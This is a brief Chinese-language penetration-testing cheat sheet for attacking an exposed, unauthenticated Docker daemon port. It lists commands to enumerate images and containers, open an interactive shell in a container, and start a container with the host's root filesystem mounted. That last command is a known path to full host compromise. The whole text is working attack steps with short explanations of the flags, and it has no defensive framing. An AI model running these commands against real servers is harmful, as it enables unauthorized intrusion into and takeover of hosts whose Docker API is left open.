Docker 的默认端口，用于 Docker 守护进程的非安全通信


**0x01 查看镜像**

```bash
docker -H $IP images
```


**0x02 查看正在运行的容器**

```bash
docker -H $IP ps
```


**0x03 进入容器目录**

```bash
docker -H $IP exec -it [NAMES] /bin/bash
#exec : 执行命令的子命令，用于在容器内执行命令。
#-it : 组合选项，表示要以交互式（Interactive）和终端（TTY）的方式运行命令
```


**0x04 远程 Docker 挂载**

```bash
docker -H $IP run --rm -it -v /:/tmp/1/ [NAMES] /bin/bash
#run : Docker子命令 ， 启动容器
#--rm : Docker容器停止后自动删除容器内容
#-it :  组合选项，表示要以交互式（Interactive）和终端（TTY）的方式运行命令
#-v /:/tmp/1/ 指定主机的根目录 / 挂载到 /tmp/1/ 目录下
#[NAMES] : 容器名称 , 通过 docker -H $IP ps 可以查看
```

